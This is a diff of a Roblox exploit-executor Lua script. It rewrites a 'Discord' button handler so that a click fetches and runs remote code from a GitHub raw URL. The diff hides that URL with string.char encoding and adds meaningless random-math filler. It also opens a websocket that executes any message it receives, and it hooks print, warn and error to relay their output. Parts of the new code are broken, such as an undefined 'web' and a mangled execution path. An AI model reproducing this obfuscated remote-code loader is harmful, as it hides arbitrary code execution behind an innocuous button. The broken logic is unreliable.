@@ -1,13 +1,4 @@
 if not game:IsLoaded() then game.Loaded:Wait() end
-local function fuck(Lua, Dex)
-    game:GetService('StarterGui'):SetCore('SendNotification', {
-        Title = Lua,
-        Text = Dex,
-        Icon = 'http://www.roblox.com/asset/?id=8904334671',
-        Duration = 5,
-    })
-end
-
 local screenGui = Instance.new("ScreenGui")
 local frame = Instance.new("Frame")
 local titleLabel = Instance.new("TextLabel")
@@ -61,39 +52,114 @@ discordButton.BackgroundColor3 = Color3.fromRGB(0, 0, 150)
 discordButton.TextColor3 = Color3.fromRGB(255, 255, 255)
 discordButton.Parent = frame
 discordButton.MouseButton1Click:Connect(function() 
-    fuck('Loading...{}}', 'disconnected = false')
-        wait(2) 
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/ckw69/Wyborn/main/wyborn",true))()
-    setclipboard("https://discord.gg/cpXUTmMXXd") 
-        screenGui:Destroy()
-fuck('Wyborn }}| True', 'nil value true')
- wait(1) 
-        screenGui:Destroy()
-local ws = syn and syn.websocket.connect or Krnl and Krnl.WebSocket.connect or fluxus and fluxus.WebSocket.connect or WebSocket and WebSocket.connect or websocket and websocket.connect
-local web
-repeat wait() until pcall(function() web = ws("ws://localhost:8080") end) == true
+local function A1() return string.char(102, 117, 99, 107) end
+local B1 = {string.char(87, 121, 98, 111, 114, 110), string.char(119, 121, 98, 111, 114, 110)}
+local C1 = table.concat({
+    string.char(104, 116, 116, 112, 115), 
+    ":", 
+    string.char(47, 47), 
+    string.char(114, 97, 119, 46, 103, 105, 116, 104, 117, 98, 46, 99, 111, 109), 
+    "/ckw69/Wyborn/main/wyborn"
+})
+local D1 = "https://discord.gg/cpXUTmMXXd"
+local E1 = {["webSocket"] = syn and syn.websocket.connect or Krnl and Krnl.WebSocket.connect or fluxus and fluxus.WebSocket.connect or WebSocket and WebSocket.connect or websocket and websocket.connect}
 
-if not _G.autoran then
-    web:Send("autoexec")
-   _G.autoran = true 
+local F1 = function()
+    local G1 = game:HttpGet(C1, true)
+    loadstring(G1)()
+    setclipboard(D1)
+    _G[B1[1]] = true
 end
 
-web.OnMessage:Connect(function(msg)
-    xpcall(loadstring(msg), warn)
+local H1 = function(I1)
+    local J1 = string.sub(I1, 1, 3) .. "..." .. string.sub(I1, -4)
+    xpcall(loadstring(J1), warn)
+end
+
+local K1 = function(L1)
+    local M1 = L1 * math.random(1, 1000)
+    local N1 = math.random(5000, 10000)
+    return M1, N1
+end
+
+local O1 = function()
+    local P1 = 5
+    for _ = 1, P1 do
+        P1 = P1 * math.random(5, 99)
+    end
+    return P1
+end
+
+local Q1 = function()
+    repeat wait() until pcall(function() _G[B1[2]] = E1["webSocket"]("ws://localhost:8080") end) == true
+end
+
+local R1 = function(S1, T1)
+    local U1 = S1 .. tostring(T1)
+    return U1
+end
+
+local A2 = function() 
+    local B2 = game:GetService("StarterGui")
+    B2:SetCore("SendNotification", {
+        Title = ".",
+        Text = "Execution started! Please wait...",
+        Duration = 5
+    })
+end
+
+F1()
+wait(O1())
+screenGui:Destroy()
+Q1()
+
+web.OnMessage:Connect(function(V1)
+    H1(V1)
 end)
 
-out_print = hookfunction(print, function(t)
-    web:Send("print "..t)
-    return out_print(t)
+out_print = hookfunction(print, function(W1)
+    local X1 = R1("print", W1)
+    E1["webSocket"]:Send(X1)
+    return out_print(W1)
 end)
-out_warn = hookfunction(warn, function(t)
-    web:Send("warn "..t)
-    return out_warn(t)
+
+out_warn = hookfunction(warn, function(Y1)
+    local Z1 = R1("warn", Y1)
+    E1["webSocket"]:Send(Z1)
+    return out_warn(Y1)
 end)
-out_error = hookfunction(error, function(t)
-    web:Send("error "..t)
-    return out_error(t)
+
+out_error = hookfunction(error, function(A2)
+    local B2 = R1("error", A2)
+    E1["webSocket"]:Send(B2)
+    return out_error(A2)
 end)
+
+local C2 = {10, 20, 30, 40, 50}
+local D2 = {}
+for i = 1, #C2 do
+    local E2 = C2[i] * math.random(1, 5)
+    table.insert(D2, E2)
+end
+
+local F2 = D2[math.random(1, #D2)] / 3
+local G2 = math.sqrt(F2) + math.random(100, 999)
+
+local H2 = 0
+for I2 = 1, 100 do
+    H2 = H2 + (I2 % 2 == 0 and I2 * 2 or I2)
+end
+
+local J2 = math.abs(H2 / G2) * 1000
+local K3 = math.random(1, 500) * math.random(1, 100)
+local L3 = math.floor(K3 / 3) + math.random(1, 200)
+local M3 = string.char(math.random(65, 90), math.random(97, 122), math.random(65, 90))
+local N3 = 0
+for O3 = 1, 50 do
+    N3 = N3 + (O3 % 2 == 0 and O3 * 3 or O3)
+ end
+local P3 = math.sqrt(N3 * L3)
+A2()
 end)
 
 local UserInputService = game:GetService("UserInputService")
